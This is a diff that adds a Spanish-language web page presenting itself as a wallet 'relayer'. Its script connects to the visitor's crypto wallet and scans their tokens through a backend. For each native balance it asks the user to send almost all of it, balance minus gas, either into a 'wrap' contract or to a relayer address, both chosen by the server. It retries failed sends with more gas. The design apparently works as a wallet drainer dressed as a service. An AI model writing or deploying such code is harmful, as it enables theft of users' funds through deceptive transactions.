@@ -1,0 +1,538 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Relayer — conectar y procesar (selector de wallets)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-capable" content="yes">
+  <style>
+    body{ font-family: Arial; max-width:900px; margin:20px auto; padding:10px; }
+    button{ padding:10px 14px; font-size:16px; }
+    pre{ background:#111; color:#b8f5b8; padding:12px; height:420px; overflow:auto; white-space:pre-wrap; }
+    /* modal selector simple */
+    .wallet-modal-overlay{
+      position:fixed; inset:0; background:rgba(0,0,0,0.45); display:flex; align-items:center; justify-content:center; z-index:9999;
+    }
+    .wallet-modal{
+      background:#fff; border-radius:8px; padding:18px; width:92%; max-width:520px; box-shadow:0 8px 30px rgba(0,0,0,0.35);
+    }
+    .wallet-modal h3{ margin:0 0 10px; font-size:18px; }
+    .wallet-list{ display:flex; flex-direction:column; gap:8px; margin-top:10px; }
+    .wallet-btn{ padding:10px; border-radius:6px; border:1px solid #e0e0e0; cursor:pointer; text-align:left; background:#fafafa; }
+    .wallet-btn:hover{ background:#f0f0f0; }
+    .wallet-sub{ font-size:12px; color:#666; margin-top:4px; }
+    .wallet-type{ font-size:11px; color:#999; margin-left:8px; }
+    /* Spinner para móviles */
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* modal confirm (mobile friendly) */
+    .confirm-overlay{ position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.5); z-index:10000; }
+    .confirm-card{ background:#fff; padding:18px; border-radius:10px; width:92%; max-width:420px; box-shadow:0 6px 18px rgba(0,0,0,0.2); }
+    .row{ display:flex; gap:8px; justify-content:flex-end; margin-top:12px; }
+  </style>
+</head>
+<body>
+  <h2>Relayer — Nativos (mejorado)</h2>
+  <p>Pulsa <b>Conectar wallet</b>. Si tienes más de una wallet instalada, verás un selector para elegir la que quieras usar.</p>
+  <div style="margin-bottom:10px;">
+    <input id="backend" value="http://localhost:3000" style="width:70%" />
+    <button id="connect">Conectar wallet</button>
+  </div>
+  <pre id="out"></pre>
+
+  <!-- ethers v5 UMD -->
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+  <!-- WalletConnect v1 UMD (mínimo). Para producción considera WalletConnect v2 / Web3Modal v2 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+
+<script>
+/* Front para nativos — versión con correcciones y soporte móvil (WalletConnect + deeplinks) */
+
+const OUT = document.getElementById('out');
+function log(msg){ OUT.textContent += msg + ""
+OUT.scrollTop = OUT.scrollHeight; console.log(msg); }
+function err(msg){ OUT.textContent += "ERROR: " + msg + ""
+OUT.scrollTop = OUT.scrollHeight; console.error(msg); }
+
+const BACKEND = () => document.getElementById('backend').value;
+const connectBtn = document.getElementById('connect');
+
+let provider = null;   // ethers provider for EVM flows
+let signer = null;
+let owner = null; 
+let chosenWalletMeta = null; // meta info about chosen wallet (type, name)
+let wcProviderInstance = null;
+
+// collect summary
+const summary = { sent: [], failed: [] };
+
+// Detectar si es dispositivo móvil
+function isMobile() {
+  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+}
+
+// modal confirm (reemplaza confirm() en móvil)
+function showModalConfirm(title, message, okText='OK', cancelText='Cancelar'){
+  return new Promise(resolve=>{
+    const overlay = document.createElement('div'); overlay.className = 'confirm-overlay';
+    overlay.innerHTML = `<div class="confirm-card"><h3>${title}</h3><div style="margin-top:8px">${message}</div><div class="row"><button id="c_cancel">${cancelText}</button><button id="c_ok">${okText}</button></div></div>`;
+    document.body.appendChild(overlay);
+    overlay.querySelector('#c_ok').onclick = ()=>{ overlay.remove(); resolve(true); };
+    overlay.querySelector('#c_cancel').onclick = ()=>{ overlay.remove(); resolve(false); };
+  });
+}
+
+function confirmAction(message){
+  if(isMobile()) return showModalConfirm('Confirmar acción', message, 'Aceptar', 'Cancelar');
+  return Promise.resolve(confirm(message));
+}
+
+function alertAction(message){
+  if(isMobile()){
+    return showModalConfirm('Aviso', message, 'OK', '');
+  }
+  alert(message);
+  return Promise.resolve(true);
+}
+
+//////////////////////////////////////
+// util: detectar rechazo del usuario
+//////////////////////////////////////
+function isUserRejected(e){
+  if(!e) return false;
+  if(e.code === 4001 || e.code === '4001') return true;
+  if(e.code === 'ACTION_REJECTED' || e.code === 'USER_REJECTED') return true;
+  const m = String(e.message || '').toLowerCase();
+  if(/user denied transaction signature|user denied|user rejected transaction|request rejected|signature request rejected/i.test(m)) return true;
+  return false;
+}
+
+//////////////////////////////////////
+// Wallet detection helpers (mejorado para móviles)
+//////////////////////////////////////
+function providerLabelFromObj(p, idx){
+  if(!p) return "Provider " + (idx+1);
+  if(p.isMetaMask) return "MetaMask";
+  if(p.isCoinbaseWallet) return "Coinbase Wallet";
+  if(p.isBrave) return "Brave Wallet";
+  if(p.isRabby) return "Rabby";
+  if(p.isImToken) return "imToken";
+  if(p.isTrust) return "Trust Wallet";
+  if(p.isFrame) return "Frame";
+  if(p.providerName) return p.providerName;
+  if(p.name) return p.name;
+  try{ if(p.constructor && p.constructor.name) return p.constructor.name; }catch(e){}
+  return "Wallet " + (idx+1);
+}
+
+// Deep links para wallets móviles (solo las más comunes)
+const MOBILE_WALLETS = {
+  metamask: {
+    name: "MetaMask",
+    deeplink: "https://metamask.app.link/dapp/",
+    universalLink: "https://metamask.app.link/dapp/",
+    schema: "metamask://"
+  },
+  trust: {
+    name: "Trust Wallet",
+    deeplink: "https://link.trustwallet.com/dapp/",
+    universalLink: "https://link.trustwallet.com/dapp/",
+    schema: "trust://"
+  },
+  coinbase: {
+    name: "Coinbase Wallet",
+    deeplink: "https://go.cb-w.com/dapp?url=",
+    universalLink: "https://go.cb-w.com/dapp?url=",
+    schema: "cbwallet://"
+  },
+  phantom: {
+    name: "Phantom",
+    deeplink: "https://phantom.app/ul/browse/",
+    universalLink: "https://phantom.app/ul/browse/",
+    schema: "phantom://"
+  }
+};
+
+function detectInjectedWalletsNoRequest(){
+  const out = [];
+  if(window.ethereum && Array.isArray(window.ethereum.providers) && window.ethereum.providers.length){
+    window.ethereum.providers.forEach((p, i) => {
+      out.push({ kind: 'evm', obj: p, name: providerLabelFromObj(p, i), hint: `injected provider #${i+1}` });
+    });
+  } else if(window.ethereum){
+    out.push({ kind: 'evm', obj: window.ethereum, name: providerLabelFromObj(window.ethereum, 0), hint: 'injected provider (global window.ethereum)' });
+  }
+
+  const walletDetectors = [
+    { name: 'Rabby', check: () => window.rabby && window.rabby.isRabby, getObj: () => window.rabby },
+    { name: 'Coinbase Wallet', check: () => window.coinbaseWalletExtension, getObj: () => window.coinbaseWalletExtension },
+    { name: 'Trust Wallet', check: () => window.trustwallet, getObj: () => window.trustwallet },
+    { name: 'OKX Wallet', check: () => window.okxwallet, getObj: () => window.okxwallet },
+    { name: 'BitKeep', check: () => window.bitkeep, getObj: () => window.bitkeep },
+    { name: 'Phantom (EVM)', check: () => window.phantom && window.phantom.ethereum, getObj: () => window.phantom.ethereum }
+  ];
+
+  for(const wallet of walletDetectors){
+    try{ if(wallet.check()){ out.push({ kind:'evm', obj: wallet.getObj(), name: wallet.name, hint: `global ${wallet.name.toLowerCase()}` }); } }catch(e){}
+  }
+
+  if(window.solana && window.solana.isPhantom) {
+    out.push({ kind: 'solana', obj: window.solana, name: 'Phantom', hint: 'Solana wallet (window.solana)' });
+  }
+
+  if(isMobile() && out.length === 0) {
+    for(const [key, wallet] of Object.entries(MOBILE_WALLETS)) {
+      out.push({ kind: 'mobile', name: wallet.name, id: key, hint: 'Mobile wallet - tap to open app' });
+    }
+  }
+
+  const unique = [];
+  const seen = new Set();
+  for(const w of out){
+    const key = w.name + (w.obj ? String(w.obj) : '');
+    if(!seen.has(key)){ seen.add(key); unique.push(w); }
+  }
+  return unique;
+}
+
+function showWalletChooser(wallets){
+  return new Promise((resolve) => {
+    const overlay = document.createElement('div'); overlay.className = 'wallet-modal-overlay';
+    overlay.innerHTML = `
+      <div class="wallet-modal" role="dialog" aria-modal="true">
+        <h3>Selecciona una wallet</h3>
+        <div class="wallet-list"></div>
+        <div style="margin-top:12px; text-align:right;">
+          <button id="cancelWalletSelect">Cancelar</button>
+        </div>
+      </div>`;
+    document.body.appendChild(overlay);
+    const list = overlay.querySelector('.wallet-list');
+    wallets.forEach((w, i) => {
+      const btn = document.createElement('button'); btn.type = 'button'; btn.className = 'wallet-btn';
+      const kindBadge = `<span class="wallet-type">[${w.kind.toUpperCase()}]</span>`;
+      btn.innerHTML = `<div><strong>${w.name}</strong> ${kindBadge}<div class="wallet-sub">${w.hint || ''}</div></div>`;
+      btn.onclick = () => { overlay.remove(); resolve({ chosen: w, index: i }); };
+      list.appendChild(btn);
+    });
+    overlay.querySelector('#cancelWalletSelect').onclick = () => { overlay.remove(); resolve(null); };
+  });
+}
+
+// Función para abrir wallet móvil
+function openMobileWallet(walletId) {
+  const currentUrl = encodeURIComponent(window.location.href);
+  const wallet = MOBILE_WALLETS[walletId];
+  if (!wallet) { err('Wallet móvil no soportada: ' + walletId); return; }
+  const universalLink = wallet.universalLink + currentUrl;
+  // iframe attempt
+  try{
+    const iframe = document.createElement('iframe'); iframe.style.display = 'none'; iframe.src = universalLink; document.body.appendChild(iframe);
+  }catch(e){}
+  // fallback to schema link
+  setTimeout(() => { try{ window.location.href = wallet.schema + 'wc?uri=' + currentUrl; }catch(e){} }, 300);
+  log('Abriendo ' + wallet.name + '...');
+}
+
+// WalletConnect (v1 UMD) connect helper
+async function connectWithWalletConnect(){
+  try{
+    if(typeof window.WalletConnectProvider === 'undefined') throw new Error('WalletConnect provider no cargado');
+    const rpc = {}; // opcional: agregar RPCs por chain
+    const wc = new window.WalletConnectProvider.default({ rpc, qrcode:false });
+    await wc.enable();
+    wcProviderInstance = wc;
+    provider = new ethers.providers.Web3Provider(wc, 'any');
+    signer = provider.getSigner();
+    try{ owner = await signer.getAddress(); }catch(e){ owner = null; }
+    log('WalletConnect conectado' + (owner ? (': ' + owner) : ''));
+    wc.on('disconnect', (code, reason) => { log('WalletConnect disconnected: ' + (reason||code)); provider = null; signer = null; owner = null; wcProviderInstance = null; });
+    return { provider, signer, owner };
+  }catch(e){ throw new Error('WalletConnect error: ' + (e.message||e)); }
+}
+
+// Función para verificar si volvimos de una wallet móvil (placeholder)
+function checkForMobileWalletResponse() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const walletResponse = urlParams.get('walletResponse');
+  if (walletResponse) { log('Respuesta de wallet recibida: ' + walletResponse); }
+}
+checkForMobileWalletResponse();
+
+//////////////////////////////////////
+// ensureProvider - Modificado para móviles pero sin romper el flujo
+//////////////////////////////////////
+async function ensureProvider(){
+  const detected = detectInjectedWalletsNoRequest();
+  log("Wallets detectadas: " + detected.map(d=>d.name + "(" + d.kind + ")").join(", "));
+  if(detected.length === 0) {
+    if (isMobile()){
+      // mostrar chooser móvil con opción WalletConnect y deeplinks
+      const mobileChoices = Object.keys(MOBILE_WALLETS).map(k=>({ kind:'mobile', id:k, name:MOBILE_WALLETS[k].name, hint:'Abrir app' }));
+      mobileChoices.unshift({ kind:'mobile', id:'walletconnect', name:'WalletConnect', hint:'Conectar con WalletConnect' });
+      const pick = await showWalletChooser(mobileChoices);
+      if(!pick) throw new Error('Selección cancelada');
+      if(pick.chosen.id === 'walletconnect'){
+        await connectWithWalletConnect();
+        if(!provider) throw new Error('WalletConnect no conectada');
+        chosenWalletMeta = { kind:'evm', name:'WalletConnect' };
+        return { provider, signer, owner };
+      }
+      openMobileWallet(pick.chosen.id);
+      throw new Error('Por favor completa la conexión en tu wallet app y luego regresa a esta página.');
+    }
+    throw new Error("No se detectaron wallets en el navegador.");
+  }
+
+  let chosen = null;
+  if(detected.length > 1){ const pick = await showWalletChooser(detected); if(!pick) throw new Error("Selección cancelada"); chosen = pick.chosen; }
+  else chosen = detected[0];
+
+  if(chosen.kind === 'mobile'){
+    // Si el chooser devolvió una wallet móvil, abrirla
+    openMobileWallet(chosen.id);
+    throw new Error('Por favor completa la conexión en tu wallet app y luego regresa a esta página.');
+  }
+
+  if(chosen.kind !== 'evm' && chosen.kind !== 'solana') {
+    throw new Error('Tipo de wallet no soportado: ' + chosen.kind);
+  }
+
+  if(chosen.kind === 'evm'){
+    try{ await chosen.obj.request({ method: 'eth_requestAccounts' }); }catch(e){ throw new Error('Permiso de accounts rechazado: ' + (e.message||e)); }
+    provider = new ethers.providers.Web3Provider(chosen.obj, 'any');
+    signer = provider.getSigner();
+    owner = await signer.getAddress();
+    chosenWalletMeta = { kind:'evm', name: chosen.name };
+    return { provider, signer, owner };
+  }
+
+  if(chosen.kind === 'solana'){
+    try{
+      const resp = await chosen.obj.connect();
+      const pubkey = resp.publicKey ? resp.publicKey.toString() : (resp?.toString && resp.toString());
+      if(!pubkey) throw new Error('No se obtuvo publicKey de la wallet Solana');
+      chosenWalletMeta = { kind:'solana', name: chosen.name, obj: chosen.obj };
+      owner = pubkey;
+      provider = null; signer = null;
+      return { kind:'solana', wallet: chosen.obj, owner };
+    }catch(e){ if(isUserRejected(e)) throw new Error('Usuario rechazó la conexión Solana'); throw new Error('Error al conectar wallet Solana: ' + (e.message||e)); }
+  }
+}
+
+//////////////////////////////////////
+// util: sleep
+//////////////////////////////////////
+function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
+
+//////////////////////////////////////
+// helper para retry de fetch JSON
+//////////////////////////////////////
+async function fetchJsonWithRetry(url, opts = {}, retries = 2, delay = 700){
+  for(let i=0;i<=retries;i++){
+    try{ const r = await fetch(url, opts); const j = await r.json().catch(()=>null); return { ok: r.ok, json: j, status: r.status }; }
+    catch(e){ if(i<retries) await sleep(delay); else return { ok:false, error: e.message||String(e) }; }
+  }
+}
+
+//////////////////////////////////////
+// MAIN: connect -> scan -> process tokens (nativos)
+// Mantengo TODO el flujo original; solo cambio confirm/alert para móvil y añado soporte WC/deeplinks en ensureProvider
+//////////////////////////////////////
+connectBtn.addEventListener('click', async()=>{
+  OUT.textContent = '';
+  summary.sent = []; summary.failed = [];
+  try{
+    await ensureProvider();
+    log('Conectado: ' + owner + ' (' + (chosenWalletMeta?.name||'') + ')');
+
+    log('Solicitando scan de tokens al backend...');
+    const r = await fetchJsonWithRetry(BACKEND() + '/owner-tokens', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ owner }) }, 2);
+    if(!r.ok){ throw new Error('/owner-tokens failed: ' + (r.status || r.error)); }
+    const tokens = (r.json && r.json.tokens) ? r.json.tokens : [];
+    log('Tokens encontrados: ' + tokens.length);
+    if(tokens.length === 0){ log('No hay tokens detectados.'); return; }
+
+    for(const t of tokens){
+      try{
+        log('---- Procesando: ' + (t.symbol||'TOKEN') + ' | chain:' + t.chain + ' | addr:' + (t.address || 'native'));
+        const isNative = !t.address;
+        if(!isNative){ log('Saltando ERC20/SPL (modo nativos only).'); continue; }
+
+        // ver que la wallet sea EVM
+        if(!provider || !signer) { err('Provider/signers no inicializados.'); summary.failed.push({token:t, reason:'no wallet'}); continue; }
+
+        // obtener balance en chain
+        let balanceBN;
+        try{ balanceBN = await provider.getBalance(owner); }catch(e){ balanceBN = ethers.BigNumber.from(t.balance || '0'); }
+        log('Balance nativo (wei): ' + balanceBN.toString());
+
+        // gasPrice con fallback
+        let gasPrice;
+        try{ gasPrice = await provider.getGasPrice(); }catch(e){ log('getGasPrice failed: ' + (e.message||e)); gasPrice = ethers.BigNumber.from('1000000000'); }
+
+        // estimaciones de gas con mejores fallbacks
+        let gasLimitTransfer = ethers.BigNumber.from(21000);
+        try{ gasLimitTransfer = await signer.estimateGas({ to: owner, value: ethers.BigNumber.from(1) }).catch(()=>gasLimitTransfer); }catch(e){}
+        // elevar fallback si demasiada baja (algunas wallets requieren más)
+        if(gasLimitTransfer.lt(ethers.BigNumber.from(30000))) gasLimitTransfer = ethers.BigNumber.from(60000);
+
+        // intenta obtener wrapped address
+        let wrappedAddr = null;
+        try{ const w = await fetchJsonWithRetry(BACKEND() + '/wrap-info', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chain: t.chain || undefined }) }, 1); if(w.ok && w.json) wrappedAddr = w.json.wrappedAddress || null; }catch(e){ }
+
+        // estimar gas para wrap si aplica
+        let gasLimitWrap = ethers.BigNumber.from(100000);
+        if(wrappedAddr){ try{ const wrapAbi = ['function deposit() payable']; const wrapC = new ethers.Contract(wrappedAddr, wrapAbi, signer); try{ gasLimitWrap = await wrapC.estimateGas.deposit({ value: ethers.BigNumber.from(1) }); }catch(e){ log('estimateGas deposit failed, using fallback ' + gasLimitWrap.toString()); } }catch(e){} }
+        if(gasLimitWrap.lt(ethers.BigNumber.from(90000))) gasLimitWrap = ethers.BigNumber.from(120000);
+
+        // buffer para seguridad
+        const buffer = gasPrice.mul(ethers.BigNumber.from(30000));
+
+        // calcular maxSafe
+        const feeWrap = gasPrice.mul(gasLimitWrap);
+        const feeTransfer = gasPrice.mul(gasLimitTransfer);
+        const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0);
+        const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0);
+
+        if(maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)){
+          const reason = 'Saldo insuficiente para cubrir gas (balance demasiado bajo)';
+          err(reason + '. balance=' + ethers.utils.formatEther(balanceBN));
+          summary.failed.push({ token:t, reason });
+          continue;
+        }
+
+        // Si hay wrapped disponible, proponemos Wrap Max
+        let actionTaken = false;
+        if(wrappedAddr && maxSafeForWrap.gt(0)){
+          const human = ethers.utils.formatUnits(maxSafeForWrap, t.decimals||18);
+          const okWrap = await confirmAction(`Wrappear ~${human} ${t.symbol} a ${wrappedAddr} (todo menos gas estimado)?`);
+          if(okWrap){
+            try{
+              const wrapAbi = ['function deposit() payable'];
+              const wrapContract = new ethers.Contract(wrappedAddr, wrapAbi, signer);
+              // Enviar con gasLimit razonable y retry en caso de fallo por gas
+              let sent = false; let lastErr = null; const maxAttempts = 3; let attemptGas = gasLimitWrap;
+              let userRejectedInWrap = false;
+              for(let i=0;i<maxAttempts && !sent;i++){
+                try{
+                  const tx = await wrapContract.deposit({ value: maxSafeForWrap, gasLimit: attemptGas });
+                  log('Wrap tx enviada: ' + tx.hash + ' (gasLimit=' + attemptGas.toString() + ')');
+                  await tx.wait();
+                  log('Wrap confirmado ✅');
+                  summary.sent.push({ token:t, type:'wrap', tx: tx.hash, amount: maxSafeForWrap.toString() });
+                  actionTaken = true; sent = true; break;
+                }catch(e){
+                  lastErr = e;
+                  if(isUserRejected(e)){
+                    userRejectedInWrap = true;
+                    log('🚫 Usuario rechazó el wrap.');
+                    summary.failed.push({ token:t, reason: 'Usuario rechazó' });
+                    break;
+                  }
+                  log('Wrap attempt failed: ' + (e.message||e) + ' — retrying with more gas');
+                  attemptGas = attemptGas.mul(2);
+                  await sleep(800);
+                }
+              }
+              if(!sent && !userRejectedInWrap){ const reason = 'Wrap failed: ' + (lastErr && (lastErr.message||lastErr)); err(reason); summary.failed.push({ token:t, reason }); }
+              if(userRejectedInWrap) actionTaken = true;
+            }catch(e){ const reason = 'Wrap error: ' + (e.message||e); err(reason); summary.failed.push({ token:t, reason }); }
+          }
+        }
+
+        if(actionTaken) continue; // ya hizo wrap o el usuario rechazó (o falló y fue registrado)
+
+        // fallback: Send Max al relayer
+        // create-transfer-request con retry
+        let trj = null; let trAttempts = 0; let trErr = null;
+        while(trAttempts < 3){
+          trAttempts++;
+          const tr = await fetchJsonWithRetry(BACKEND() + '/create-transfer-request', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ owner, chain: t.chain, amount: balanceBN.toString() }) }, 0);
+          if(tr.ok && tr.json && tr.json.ok){ trj = tr.json; break; }
+          trErr = tr.error || JSON.stringify(tr.json || tr);
+          log('create-transfer-request attempt ' + trAttempts + ' failed: ' + trErr);
+          await sleep(600);
+        }
+        if(!trj){ const reason = 'create-transfer-request failed after retries: ' + trErr; err(reason); summary.failed.push({ token:t, reason }); continue; }
+
+        const relayerAddress = trj.instructions && trj.instructions.relayerAddress ? trj.instructions.relayerAddress : (trj.relayerAddress || null);
+        if(!relayerAddress){ const reason = 'Relayer address missing in create-transfer-request response'; err(reason); summary.failed.push({ token:t, reason }); continue; }
+
+        // calcular maxSend seguro
+        const fee = gasPrice.mul(gasLimitTransfer).add(buffer);
+        const maxSend = balanceBN.gt(fee) ? balanceBN.sub(fee) : ethers.BigNumber.from(0);
+        if(maxSend.lte(0)){ const reason = 'No hay saldo suficiente para enviar al relayer después de fees'; err(reason); summary.failed.push({ token:t, reason }); continue; }
+
+        const humanSend = ethers.utils.formatUnits(maxSend, t.decimals||18);
+        const okSend = await confirmAction(`Enviar máximo seguro (${humanSend} ${t.symbol}) al relayer ${relayerAddress}?`);
+        if(!okSend){ log('Usuario canceló envío nativo.'); summary.failed.push({ token:t, reason: 'user_cancelled' }); continue; }
+
+        // enviar con reintentos y aumento de gas si falla
+        let sent = false; let lastError = null; let attemptGasLimit = gasLimitTransfer;
+        let userRejectedInSend = false;
+        for(let attempt=1; attempt<=4 && !sent; attempt++){
+          try{
+            const tx = await signer.sendTransaction({ to: relayerAddress, value: maxSend, gasLimit: attemptGasLimit });
+            log('Transfer tx enviada: ' + tx.hash + ' (attempt ' + attempt + ', gasLimit=' + attemptGasLimit.toString() + ')');
+            await tx.wait();
+            log('Transfer confirmada ✅');
+            summary.sent.push({ token:t, type:'transfer', tx:tx.hash, amount: maxSend.toString(), jobId: trj.jobId });
+            sent = true; break;
+          }catch(e){
+            lastError = e;
+            if(isUserRejected(e)){
+              userRejectedInSend = true;
+              log('🚫 Usuario rechazó la transferencia.');
+              summary.failed.push({ token:t, reason: 'Usuario rechazó' });
+              break;
+            }
+            log('Transfer attempt ' + attempt + ' failed: ' + (e.message||e));
+            attemptGasLimit = attemptGasLimit.mul(2);
+            await sleep(800);
+          }
+        }
+        if(!sent && !userRejectedInSend){ const reason = 'Transfer failed after retries: ' + (lastError && (lastError.message||lastError)); err(reason); summary.failed.push({ token:t, reason }); }
+        // si userRejectedInSend true o sent true, pasamos al siguiente token
+        if(userRejectedInSend) continue;
+
+      }catch(inner){ err('Inner token process error: ' + (inner.message || inner)); summary.failed.push({ token:t, reason: inner && (inner.message||String(inner)) }); continue; }
+    }
+
+    // summary al final
+    log('=== Resumen ===');
+    log('Envios exitosos: ' + summary.sent.length);
+    for(const s of summary.sent) log('  - ' + (s.type||'') + ' tx ' + s.tx + ' amount ' + (s.amount ? s.amount : 'n/a'));
+    log('Fallos: ' + summary.failed.length);
+    for(const f of summary.failed) log('  - token ' + (f.token && (f.token.symbol||f.token.address||'native')) + ' => ' + (f.reason||'unknown'));
+
+    if(summary.failed.length) await alertAction('Algunos tokens no fueron procesados. Revisa el log para detalles.');
+
+  }catch(e){ 
+    if(e.message && e.message.includes("Por favor completa la conexión")){
+      log(e.message);
+    } else {
+      err('ERROR general: ' + (e.message || e)); 
+    }
+  }
+});
+
+</script>
+
+</body>
+</html>
